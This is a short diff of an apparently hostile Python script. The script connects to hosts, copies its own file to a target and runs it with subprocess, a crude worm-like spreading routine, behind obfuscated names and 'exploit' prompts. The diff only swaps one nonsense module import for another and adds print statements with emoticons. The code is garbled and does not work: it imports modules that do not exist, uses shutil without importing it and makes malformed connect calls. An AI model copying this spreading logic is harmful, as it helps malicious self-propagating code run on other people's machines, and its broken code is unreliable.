@@ -1,6 +1,6 @@
 import os
 import socket
-import glalglalgalglalaa
+import glglalghlaglallala
 import subprocess
 import urllib.request
 
@@ -28,7 +28,7 @@ while True:
 
         try:
             socket.create_connection((p65, f34))
-            print(str(p65) + " :3")
+            print(str(p65) + ":" + str(f34) + " :3")
             print("exploit")
             print("getmeout")
             r43 = input("What now: ")
@@ -77,7 +77,9 @@ while True:
                         s.connect(p65 + str(i))
                         shutil.copy2(filename, p65)
                         subprocess.run(['python3', '{}/{}'.format(p65, os.path.basename(filename))])
+                        print(str(p65) + ":" + str(i) + ":" + str(f34) + " ^^")
                     except:
+                        print(str(p65) + ":" + str(i) + ":" + str(f34) + " @w@")
                         pass
                 
             elif r43 == "getmeout":
